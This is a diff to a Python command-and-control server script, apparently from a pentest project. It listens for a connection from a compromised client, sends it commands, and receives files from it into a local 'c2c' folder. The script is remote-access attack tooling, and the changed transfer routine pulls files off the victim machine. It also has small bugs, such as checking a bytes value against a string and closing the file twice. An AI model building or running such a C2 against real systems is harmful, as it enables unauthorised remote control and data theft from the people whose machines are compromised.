@@ -11,21 +11,23 @@ CHUNK = 1024
 PATH = os.environ['HOME'] + '/Desktop'
 
 def transfer(conn, command):
+    _, _filename = command.decode().split("*")
     conn.send(command)
-    file_name = PATH + '/place_holder.jpg'
-    f = open(file_name, 'wb')
+    file_name = PATH + '/pentest_projects/c2c/' + _filename
 
-    while(True):
-        data = conn.recv(CHUNK)
-        if data.ends_with('DONE'.encode()):
-            f.write(data[:-4])
-            f.close()
-            print("[+] File transfer completed")
-            break
-        if "File not found" in data:
-            print("[-] File was not found")
-            break
-        f.write(data)
+    with open(file_name, 'wb') as f:
+      while(True):
+          data = conn.recv(CHUNK)
+          if data.endswith('DONE'.encode()):
+              f.write(data[:-4])
+              f.close()
+              print("[+] File transfer completed")
+              break
+          if "File not found" in data:
+              print("[-] File was not found")
+              break
+          f.write(data)
+    print("Output was saved to file:", file_name)
 
 def print_usage():
   print("""
@@ -50,7 +52,7 @@ def connect():
       s = create_socket()
       conn, addr = s.accept()
       print('[+] connection from ', addr)
-      while(1):
+      while(True):
           command = check_input()
           if 'exit' in command:
               conn.send(command.encode())
